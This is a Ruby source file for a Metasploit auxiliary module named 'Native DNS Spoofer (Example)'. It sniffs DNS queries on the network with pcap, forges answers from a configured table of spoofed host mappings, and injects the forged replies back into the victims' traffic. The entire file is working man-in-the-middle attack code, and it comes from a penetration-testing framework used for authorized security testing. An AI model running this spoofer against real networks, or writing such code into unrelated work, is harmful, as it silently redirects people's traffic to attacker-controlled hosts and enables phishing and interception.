##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/dns'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Exploit::Remote::DNS::Client
  include Msf::Exploit::Remote::DNS::Server

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Native DNS Spoofer (Example)',
      'Description'    => %q{
        This module provides a Rex based DNS service to resolve queries intercepted
        via the capture mixin. Configure STATIC_ENTRIES to contain host-name mappings
        desired for spoofing using a hostsfile or space/semicolon separated entries.
      },
      'Author'         => 'RageLtMan <rageltman[at]sempervictus>',
      'License'        => MSF_LICENSE,
      'References'     => []
    ))

    register_options(
      [
        OptString.new('FILTER', [false, 'The filter string for capturing traffic', 'dst port 53']),
        OptAddress.new('SRVHOST', [true, 'The local host to listen on for DNS services.', '127.0.2.2'])
      ], self.class)

    deregister_options('PCAPFILE')
  end

  #
  # Wrapper for service execution and cleanup
  #
  def run
    begin
      start_service
      capture_traffic
      service.wait
    ensure
      @capture_thread.kill if @capture_thread
      close_pcap
      stop_service(true)
    end
  end

  #
  # Generates reply with src and dst reversed
  # Maintains original packet structure, proto, etc
  #
  def reply_packet(pack)
    rep = pack.dup
    rep.eth_dst, rep.eth_src = rep.eth_src, rep.eth_dst
    rep.ip_dst, rep.ip_src = rep.ip_src, rep.ip_dst
    if pack.is_udp?
      rep.udp_dst, rep.udp_src = rep.udp_src, rep.udp_dst
    else
      rep.tcp_dst, rep.tcp_src = rep.tcp_src, rep.tcp_dst
    end
    return rep
  end

  #
  # Configures capture and handoff
  #
  def capture_traffic
    check_pcaprub_loaded()
    ::Socket.do_not_reverse_lookup = true  # Mac OS X workaround
    open_pcap({'FILTER' => datastore['FILTER']})
    @capture_thread = Rex::ThreadFactory.spawn("DNSSpoofer", false) do
      each_packet do |pack|
        parsed = PacketFu::Packet.parse(pack)
        reply = reply_packet(parsed)
        service.dispatch_request(reply, parsed.payload)
      end
    end
  end

  #
  # Creates Proc to handle incoming requests
  #
  def on_dispatch_request(cli,data)
    peer = "#{cli.ip_daddr}:"
    if cli.is_udp?
      peer << "#{cli.udp_dst}"
    else
      peer << "#{cli.tcp_dst}"
    end
    # Deal with non DNS traffic
    begin
      req = Packet.encode_net(data)
    rescue => e
      print_error("Could not decode payload segment of packet from #{peer}")
      dlog e.backtrace
      return
    end
    asked = req.question.map(&:qName).join(', ')
    vprint_status("Received request for #{asked} from #{peer}")
    forward = req.dup
    # Find cached items, remove request from forwarded packet
    req.question.each do |ques|
      cached = service.cache.find(ques.qName, ques.qType.to_s)
      if cached.empty?
        next
      else
        req.answer = req.answer + cached
        forward.question.delete(ques)
        hits = cached.map do |hit|
          hit.name + ':' + hit.address.to_s + ' ' + hit.type
        end.each {|h| vprint_status("Cache hit for #{h}")}
      end
    end
    if req.answer.size < 1
      print_status("Could not spoof any domains for #{peer} request #{asked}")
      return
    end
    req.header.qr = 1
    service.send_response(cli, Packet.validate(Packet.generate_response(req)).data)
  end

  #
  # Creates Proc to handle outbound responses
  #
  def on_send_response(cli,data)
    cli.payload = data
    cli.recalc
    inject cli
  end


end
